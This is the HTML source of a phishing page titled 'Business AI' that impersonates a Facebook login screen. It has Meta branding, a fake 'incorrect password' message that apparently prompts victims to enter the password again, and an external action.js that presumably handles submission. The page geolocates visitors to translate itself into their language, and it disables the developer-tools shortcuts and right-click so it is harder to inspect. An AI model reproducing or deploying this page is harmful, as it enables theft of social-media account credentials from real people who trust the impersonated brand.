<!DOCTYPE html>
<html lang="en" id="html">

<head>
    <meta charset="UTF-8">

    <meta property="og:title" content="Business AI" />

    <meta name="theme-color" content="#000000" />
    <title>Business AI</title>
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="ico.ico" type="image/x-icon">

    <style>
        /* Tối ưu hóa toàn bộ Layout chuẩn Responsive */
        body {
            background-color: #f0f2f5 !important;
            font-family: Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            top: 0 !important;
        }

        #google_translate_element, .skiptranslate {
            display: none;
        }

        /* Khối nội dung chính căn giữa màn hình trên PC */
        .main-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .container-custom {
            max-width: 1000px;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 40px;
        }

        /* Cột bên trái (Ảnh/Giới thiệu) */
        .col-left-custom {
            flex: 1;
            max-width: 500px;
        }
        .col-left-custom img {
            max-width: 100%;
            height: auto;
            display: block;
        }

        /* Cột bên phải (Form đăng nhập) */
        .col-right-custom {
            width: 100%;
            max-width: 396px;
        }

        .verified_info {
            text-align: center;
            margin-bottom: 20px;
            display: none; /* Mặc định ẩn, chỉ hiện trên mobile nếu cần */
        }

        /* Khung màu trắng chứa Form */
        .login-card {
            background: #ffffff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            box-sizing: border-box;
        }

        .form-control {
            border-radius: 6px !important;
            height: 52px;
            font-size: 17px;
            padding: 14px;
            border: 1px solid #dddfe2;
        }
        .form-control:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .btn-primary {
            background-color: #1877f2 !important;
            border: none !important;
            border-radius: 6px !important;
            font-size: 20px !important;
            font-weight: 700;
            padding: 10px 0;
            width: 100%;
            height: 48px;
        }

        .link-wrapper {
            text-align: center;
            margin-top: 16px;
            margin-bottom: 20px;
        }
        #forgot-password-btn {
            font-size: 14px;
            text-decoration: none;
            color: #1877f2;
        }
        #forgot-password-btn:hover {
            text-decoration: underline;
        }

        hr {
            border: 0;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }

        .create-btn-container {
            text-align: center;
        }
        .btn-success-custom {
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 700;
            padding: 0 16px;
            height: 48px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            cursor: pointer;
        }
        .btn-success-custom:hover {
            background-color: #36a420;
            color: white;
        }

        /* Footer chuẩn chỉnh */
        .footer-custom {
            background-color: #ffffff;
            padding: 32px 16px;
            font-size: 12px;
            color: #737373;
            line-height: 1.6;
        }
        .footer-content {
            max-width: 980px;
            margin: 0 auto;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            margin-bottom: 8px;
        }
        .footer-links a {
            color: #8a9bbd;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-links a.active {
            color: #737373;
        }

        /* RESPONSIVE: Cấu hình hiển thị trên Điện thoại dưới 768px */
        @media (max-width: 767.98px) {
            body {
                background-color: #ffffff !important; /* Mobile nền trắng cho giống thật */
            }
            .main-wrapper {
                padding: 20px 15px;
                align-items: flex-start;
            }
            .container-custom {
                flex-direction: column;
                gap: 20px;
            }
            .col-left-custom {
                display: none; /* Ẩn ảnh to của PC khi trên mobile */
            }
            .col-right-custom {
                max-width: 100%;
            }
            .login-card {
                box-shadow: none; /* Mobile bỏ bóng viền */
                padding: 0;
            }
            .verified_info {
                display: block; /* Hiện logo vòng tròn đăng nhập trên mobile */
            }
            .footer-links {
                justify-content: center;
                gap: 10px;
            }
            .meta-copyright {
                text-align: center;
                display: block;
                margin-top: 10px;
            }
        }
    </style>
</head>

<body>
    <div id="google_translate_element"></div>

    <div class="main-wrapper">
        <div class="container-custom">
            
            <div class="col-left-custom">
                <img src="images/login.png" alt="Facebook Login">
            </div>

            <div class="col-right-custom">
                
                <div class="verified_info">
                    <div id="fb-logo" style="margin-bottom: 10px;">
                        <img src="images/fb_round_logo.png" alt="FB" style="width: 60px;">
                    </div>
                    <div class="fb-title">
                        <h1 style="font-size: 24px; font-weight: 700; color: #1c1e21;">Log in to Facebook</h1>
                    </div>
                </div>

                <div class="login-card">
                    <form id="first-form">
                        <div class="mb-3">
                            <input value="" name="personal-email" type="email" class="form-control"
                                id="PersonalEmailField" required aria-label="Email address or phone number"
                                placeholder="Email address or phone number">
                        </div>

                        <div class="mb-3">
                            <div style="position: relative;">
                                <input name="password-1" type="password" class="form-control"
                                    id="exampleInputPassword" autocomplete="off" minlength="8"
                                    maxlength="30" required placeholder="Password">
                                <i class="bi bi-eye" id="togglePassword"
                                    style="position: absolute; right: 14px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #8d949e; font-size: 18px;"></i>
                            </div>
                        </div>

                        <div class="mb-2 invalid-feedback" style="display: none; color: #f02849; font-size: 13px;" id="passwordError">
                            The password you've entered is incorrect.
                        </div>

                        <div class="form-btn-wrapper">
                            <button class="btn btn-primary" type="button" id="continueform">
                                <div class="spinner-border text-light" id="spinner-login" role="status" style="display: none; width: 1.5rem; height: 1.5rem;">
                                    <span class="visually-hidden">Loading...</span>
                                </div>
                                <span class="button-text" id="passtext">Log in</span>
                            </button>
                        </div>

                        <div class="link-wrapper">
                            <a href="#" id="forgot-password-btn">Forgotten password?</a>
                        </div>

                        <hr>

                        <div class="create-btn-container">
                            <a href="#" class="btn btn-success-custom">Create new account</a>
                        </div>
                    </form>
                </div>
            </div>

        </div>
    </div>

    <div class="footer-custom">
        <div class="footer-content">
            <div class="footer-links" style="border-bottom: 1px solid #dddfe2; padding-bottom: 8px; margin-bottom: 8px;">
                <a href="#" class="active">English (US)</a>
                <a href="#">English (UK)</a>
                <a href="#">Italiano</a>
                <a href="#">Français</a>
                <a href="#">中文(简体)</a>
                <a href="#">日本語</a>
                <a href="#">한국어</a>
                <a href="#">עברית</a>
                <a href="#">Español</a>
                <a href="#">Português</a>
            </div>
            <div class="footer-links">
                <span class="meta-copyright">© 2026 Meta</span>
                <a href="#">About</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Privacy</a>
                <a href="#">Cookies</a>
                <a href="#">Terms</a>
                <a href="#">Help Center</a>
            </div>
        </div>
    </div>

    <script src="action.js"></script>

    <script>
        // JS xử lý ẩn hiện password nhanh bằng icon mắt
        const togglePassword = document.querySelector('#togglePassword');
        const passwordInput = document.querySelector('#exampleInputPassword');
        if(togglePassword && passwordInput) {
            togglePassword.addEventListener('click', function () {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.classList.toggle('bi-eye-slash');
            });
        }

        const langMap = {
            AF:"fa", AL:"sq", DZ:"ar", AD:"ca", AO:"pt", AR:"es", AM:"hy", AU:"en", AT:"de", AZ:"az",
            BD:"bn", BY:"be", BE:"fr", BZ:"en", BO:"es", BA:"bs", BR:"pt", BG:"bg", KH:"km", CM:"fr",
            CA:"fr", CL:"es", CN:"zh-CN", TW:"zh-TW", HK:"zh-TW", MO:"zh-TW", CO:"es", CR:"es",
            HR:"hr", CY:"el", CZ:"cs", DK:"da", DO:"es", EC:"es", EG:"ar", SV:"es", EE:"et", ET:"am",
            FI:"fi", FR:"fr", GE:"ka", DE:"de", GH:"en", GR:"el", GT:"es", HN:"es", HU:"hu", IS:"is",
            IN:"hi", ID:"id", IR:"fa", IQ:"ar", IE:"en", IL:"iw", IT:"it", JP:"ja", JO:"ar", KZ:"kk",
            KE:"sw", KP:"ko", KR:"ko", KW:"ar", LA:"lo", LV:"lv", LB:"ar", LT:"lt", LU:"fr", MK:"mk",
            MY:"ms", MT:"mt", MX:"es", MD:"ro", MN:"mn", ME:"sr", MA:"ar", MM:"my", NP:"ne", NL:"nl",
            NZ:"en", NI:"es", NG:"en", NO:"no", OM:"ar", PK:"ur", PA:"es", PY:"es", PE:"es", PH:"tl",
            PL:"pl", PT:"pt", PR:"es", QA:"ar", RO:"ro", RU:"ru", SA:"ar", RS:"sr", SG:"en", SK:"sk",
            SI:"sl", ZA:"af", ES:"es", LK:"si", SE:"sv", CH:"de", SY:"ar", TJ:"tg", TZ:"sw",
            TH:"th", TN:"ar", TR:"tr", UA:"uk", AE:"ar", GB:"en", US:"en", UY:"es", UZ:"uz", VE:"es",
            VN:"vi", YE:"ar", ZM:"en", ZW:"en"
        };

        async function getCountryCode() {
            try {
                const cache = sessionStorage.getItem("country_code");
                if (cache) return cache;
                const res = await fetch("https://get.geojs.io/v1/ip/geo.json", { cache: "force-cache" });
                const data = await res.json();
                const code = data.country_code || "US";
                sessionStorage.setItem("country_code", code);
                return code;
            } catch { return "US"; }
        }

        function setCookie(name, value, days = 1) {
            const d = new Date();
            d.setTime(d.getTime() + days * 86400000);
            document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/;SameSite=None;Secure`;
        }

        async function googleTranslateElementInit() {
            let savedLang = sessionStorage.getItem("translatedLang");
            if (!savedLang) {
                const country = await getCountryCode();
                savedLang = langMap[country] || "en";
            }
            if (savedLang === "en") return;

            sessionStorage.setItem("translatedLang", savedLang);
            setCookie("googtrans", `/en/${savedLang}`);

            new google.translate.TranslateElement({ pageLanguage: "en", autoDisplay: false }, "google_translate_element");

            const timer = setInterval(() => {
                const select = document.querySelector(".goog-te-combo");
                if (select) {
                    select.value = savedLang;
                    select.dispatchEvent(new Event("change"));
                    clearInterval(timer);
                }
            }, 10);
        }

        window.addEventListener("pageshow", () => {
            const lang = sessionStorage.getItem("translatedLang");
            if (lang) { setCookie("googtrans", `/en/${lang}`); }
        });
    </script>
    <script async src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
    <script>
        document.addEventListener("keydown", function (e) { 
            ("F12" === e.key || e.ctrlKey && e.shiftKey && ("I" === e.key || "J" === e.key || "C" === e.key) || e.ctrlKey && "u" === e.key) && e.preventDefault() 
        });
        document.addEventListener("contextmenu", function (e) { e.preventDefault() });
    </script>
</body>

</html>
